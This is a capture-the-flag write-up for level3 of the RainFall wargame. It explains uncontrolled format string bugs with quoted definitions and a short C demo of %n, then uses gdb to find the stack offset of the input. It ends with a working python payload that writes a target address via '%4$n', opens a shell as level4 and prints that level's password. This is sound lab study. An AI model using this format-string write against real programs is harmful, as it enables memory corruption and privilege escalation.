

"fuzzing or fuzz testing = testing technique that involves providing invalid, unexpected, or random data as inputs to a computer program = The program then crashes"

"one key thing in hacking is about giving non intended inputs to programs and observe its behavior"

retrieve five parameters from the stack and display them as 8-digit padded hexa

level3@RainFall:~$ ./level3

%08x %08x %08x %08x %08x

00000200 b7fd1ac0 b7ff37d0 78383025 38302520

Uncontrolled format string

"One may also write arbitrary data to arbitrary locations using the %n format token, which commands printf() and similar functions to write the number of bytes formatted to an address stored on the stack."

wiki

%n is a special format specifier which instead of printing something causes printf() to load the variable pointed by the corresponding argument with a value equal to the number of characters that have been printed by printf()  before the occurrence of %n
https://www.geeksforgeeks.org/g-fact-31/


#include<stdio.h>

int main()

{

    int c;
    printf("123456789A%n     \n", &c);
    printf("%d", c);
    return 0;
    
    // output
    // 123456789A     
    // 10
    
}

* Geeks4Geeks

"the ‘%n’ parameter, which writes the number of bytes already printed, into a variable of our choice. The address of the variable is given to the format function by placing an integer pointer as parameter onto the stack."
https://cs155.stanford.edu/papers/formatstring-1.2.pdf



```
(gdb) run <<< "AAAA %p %p %p %p %p"

finding the offset of our input string in the stack
 
esp after fgets

(gdb) f
0xbffff4e0:	0xbffff4f0	0x00000200	0xb7fd1ac0	0xb7ff37d0
0xbffff4f0:	0x41414141	0x20702520	0x25207025	0x70252070

level3@RainFall:~$ ./level3
AAAA %p %p %p %p %p
AAAA 0x200 0xb7fd1ac0 0xb7ff37d0 0x41414141 0x20702520
```

41414141(the 4th hex value), 41 represent A so 4 is the offset of our input string in the stack.

from the stanford article:

a way to directly address a stack parameter from within the format string, The direct parameter access is controlled by the ‘$’ qualifier.

so in our case
```
level3@RainFall:~$ ./level3
AAAA %p %4$x
AAAA 0x200 41414141
```

```
level3@RainFall:~$ (python -c 'print "\x08\x04\x98\x8c"[::-1] + "A" * 60 + "%4$n"' ; cat ) | ./level3
�AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Wait what?!
pwd
/home/user/level3
whoami
level4
cat //home/user/level4/.pass
b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
```
